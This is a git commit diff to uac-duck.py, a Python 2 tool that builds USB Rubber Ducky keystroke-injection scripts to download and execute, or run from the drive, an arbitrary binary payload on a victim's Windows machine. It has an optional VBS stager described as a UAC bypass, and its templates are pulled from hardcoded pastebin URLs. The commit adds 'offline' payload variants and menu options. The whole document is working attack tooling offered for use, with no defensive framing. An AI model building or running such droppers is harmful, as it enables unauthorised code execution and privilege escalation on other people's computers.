55dec8081f76e985d52d0649c9df011786ad9496
SkiddieTech <skiddie@tutanota.com>
2016-12-30 03:19:50 +0100

    Major update
    Added the offline version of the payload(s)
    with and without the UAC stager.
    Did some minor changes aswell.

--- uac-duck.py
+++ uac-duck.py
@@ -8,10 +8,10 @@ def genscripton():
 	if os.path.isfile('DuckyScript.txt'):
 		os.remove('DuckyScript.txt')
 		
-	print "[+]Please input your UAC VBS Payload URL(Pastebin/RAW recommended):"
+	print "[+]Please input your UAC VBS Payload URL (Pastebin/RAW recommended Example: http://pastebin.com/raw/VBSPAYLOAD ):"
 	genpayon_url = raw_input().lower()
 	
-	print "[+]Please input your Payload save filename (Deafult: update.vbs):"
+	print "[+]Please input your Payload save filename (Example: update.vbs):"
 	genpayon_name = raw_input().lower()
 	
 	if not genpayon_name and genpayon_url:
@@ -23,6 +23,7 @@ def genscripton():
 			the_file.write(txt)
 		print 'Payload DuckyScript.txt generated!!' 
 		time.sleep(2)
+		main()
 		
 	elif genpayon_name.endswith(".vbs") and genpayon_url:
 		with open('DuckyScript.txt', 'a') as the_file:
@@ -32,6 +33,7 @@ def genscripton():
 			the_file.write(txt)
 		print 'Payload DuckyScript.txt generated!!' 
 		time.sleep(2)
+		main()
 		
 	else:
 		print "Please input a valid URL"
@@ -77,13 +79,55 @@ def duckencodedownload():
 	else:
 		print "Please answer Yes(y) or No(n)"
 
+def genuacoff():
+	
+	print "-> Ducky D&E Blazing fast payload (WITH  UAC bypass) Offline <- "
+	print "----------------------------------------------------------------"
+	
+	if os.path.isfile('DuckyScript.txt'):
+		os.remove('DuckyScript.txt')
 		
+	
+	print "[+]Please input your binary payload name located on the drive(Example: update.exe):"
+	genpayon_payloadname = raw_input().lower()
+	
+	print "[+]Please input your desired UAC VBS local filename(Example: update.vbs):"
+	genpayon_stagername = raw_input().lower()
+	
+	print "[+]Please input your Twin-Duck drivename (Example: backup ):"
+	genpayon_drivename = raw_input().lower()
+	
+	if genpayon_drivename:
+		if genpayon_payloadname.endswith(".exe") and genpayon_stagername.endswith(".vbs"):
+			with open(genpayon_stagername, 'a') as the_file:
+				txt = urllib.urlopen("http://pastebin.com/raw/GBZZsPEe").read()
+				txt = txt.replace('[NAME]', genpayon_payloadname)
+				the_file.write(txt)
+			print 'VBS Stager "' + genpayon_stagername + '" generated!' 
+			time.sleep(3)
+			with open("DuckyScript.txt", 'a') as the_file:
+				txt = urllib.urlopen("http://pastebin.com/raw/mXLM5hrC").read()
+				txt = txt.replace('[NAME]', genpayon_stagername)
+				txt = txt.replace('[DRIVENAME]', genpayon_drivename)
+				the_file.write(txt)
+			print 'Payload DuckyScript.txt generated!!'
+			print 'Please place the "' + genpayon_stagername + '" file and your "' + genpayon_payloadname + '" on your rubber-ducky with drivename "' + genpayon_drivename + '" drive';
+			time.sleep(10)
+			main()
+		else:
+			print "Please input a valid payload and/or stager local filename ( Must end with .vbs/.exe)"
+			genuacoff()	
+	else:
+		print "Please input a USB drivename"
+		genuacoff()
+	
 def genuac():
 	if os.path.isfile('UAC-Duck-Payload.vbs'):
 		os.remove('UAC-Duck-Payload.vbs')
 		
-	print "-> Ducky D&E Blazing fast payload (WITH  UAC bypass) <- "
-	print "[+]Please input your binary payload direct link URL( www.example.com/pay.exe):"
+	print "-> Ducky D&E Blazing fast payload (WITH  UAC bypass) Online <- "
+	print "---------------------------------------------------------------"
+	print "[+]Please input your binary payload direct link URL( Example: www.example.com/pay.exe):"
 	genpayon_url = raw_input().lower()
 	
 	print "[+]Please input your Payload save filename (Deafult: update.exe):"
@@ -113,14 +157,48 @@ def genuac():
 	else:
 		print "Please input a valid savename/URL ( Must end with .exe)"
 		genuac()
-		
 
+
+def genoff():
+	if os.path.isfile('DuckyScript.txt'):
+		os.remove('DuckyScript.txt')
+		
+	print "-> Ducky D&E Blazing fast payload (Without UAC bypass) Offline <- "
+	print "------------------------------------------------------------------"
+	
+	print "[+]Please input your binary payload name located on the drive(Example: update.exe):"
+	genpayon_name = raw_input().lower()
+
+	
+	print "[+]Please input your Twin-Duck drivename (Example: backup ):"
+	genpayon_drivename = raw_input().lower()
+	
+	
+
+	if genpayon_name.endswith(".exe"):
+		with open('DuckyScript.txt', 'a') as the_file:
+			txt = urllib.urlopen("http://pastebin.com/raw/mXLM5hrC").read()
+			txt = txt.replace('[DRIVENAME]', genpayon_drivename)
+			txt = txt.replace('[NAME]', genpayon_name)
+			the_file.write(txt)
+		print 'Payload DuckyScript.txt generated!!' 
+		print "Remember to place your "' +  genpayon_name + '" payload on the ducky drive and rename the drive accordingly" 
+		time.sleep(5) 
+		main()
+	else:
+		print "Please input a valid binary payload and drivename"
+		genoff()
+		
+		
+	
 def gen():
 
 	if os.path.isfile('DuckyScript.txt'):
 		os.remove('DuckyScript.txt')
 		
-	print "-> Ducky D&E Blazing fast payload (Without UAC bypass) <- "
+	print "-> Ducky D&E Blazing fast payload (Without UAC bypass) Online <- "
+	print "-----------------------------------------------------------------"
+	
 	print "[+]Please input your binary payload direct link URL( www.example.com/pay.exe):"
 	genpayon_url = raw_input().lower()
 	
@@ -136,6 +214,7 @@ def gen():
 			the_file.write(txt)
 		print 'Payload DuckyScript.txt generated!!' 
 		time.sleep(2)
+		main()
 	elif genpayon_name.endswith(".exe") and genpayon_url.endswith(".exe"):
 		with open('DuckyScript.txt', 'a') as the_file:
 			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
@@ -144,7 +223,7 @@ def gen():
 			the_file.write(txt)
 		print 'Payload DuckyScript.txt generated!!' 
 		time.sleep(2)
-		duckencode()
+		main()
 	else:
 		print "Please input a valid savename/URL ( Must end with .exe)"
 		gen()
@@ -167,21 +246,30 @@ def main():
 	print "What would you like to do?"
 	print ""
 	print ""
-
+	print "[-------------ONLINE-VERSION-------------------]"
 	print "[1] - Generate binary download & execute ducky script (Without UAC bypass)"
 	print "[2] - Generate binary download & execute ducky script (With UAC bypass - 2 stager)"
-	
+	print ""
+	print "[-------------OFFLINE-VERSION-------------------]"
+	print "[3] - Generate binary download & execute ducky script (Without UAC bypass)"
+	print "[4] - Generate binary download & execute ducky script (With UAC bypass - 2 stager)"
 	
 	choice = raw_input().lower()
 
 	DeNoUac = set(['1','[1]'])
 	DeUAC = set(['2','[2]'])
+	DeNoUacOff = set(['3','[3]'])
+	DeUACOff = set(['4','[4]'])
 
 
 	if choice in DeNoUac:
 	   gen()
 	elif choice in DeUAC:
 	   genuac()
+	elif choice in DeNoUacOff:
+	   genoff()
+	elif choice in DeUACOff:
+	   genuacoff()
 	else:
 	   print "Please input a number corresponding with your choose(1,2,3,4)"
 		
